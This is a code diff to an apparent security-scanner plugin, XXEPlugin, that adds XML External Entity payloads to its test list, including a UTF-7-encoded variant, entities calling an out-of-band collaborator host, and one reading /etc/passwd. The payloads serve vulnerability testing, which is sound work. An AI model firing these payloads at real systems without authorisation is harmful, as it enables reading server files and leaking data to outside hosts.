@@ -37,6 +37,9 @@ public class XXEPlugin implements IAuditPlugin {
         XXEPayloads.add("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><!DOCTYPE root PUBLIC \"-//B/A/EN\" \"http://{collaboratorPayload}/\"><root>a0e5c</root>");
         XXEPayloads.add("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe1 \"dryat\"><!ENTITY xxe2 \"0Uct\"><!ENTITY xxe3 \"333\"><!ENTITY xxe \"&xxe1;&xxe3;&xxe2;\">]><methodCall><methodName>BalanceSimple.CreateOrderOrSubscription</methodName><params><param><value><string>&xxe;test</string></value></param><param>x</params></methodCall>");
         XXEPayloads.add("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE tst SYSTEM \"http://{collaboratorPayload}\">\n<tst></tst>");
+        XXEPayloads.add("<?xml version=\"1.0\" encoding=\"UTF-7\"?>\n+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4\n+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://{collaboratorPayload}+ACI +AD4AXQA+\n+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4");
+        XXEPayloads.add("<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY test SYSTEM \"http://{collaboratorPayload}/entity1.xml\">]>\n<lolz><lol>3..2..1...&test<lol></lolz>");
+        XXEPayloads.add("<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ \n<!ELEMENT foo (#ANY)>\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>");
     }
 
     @Override
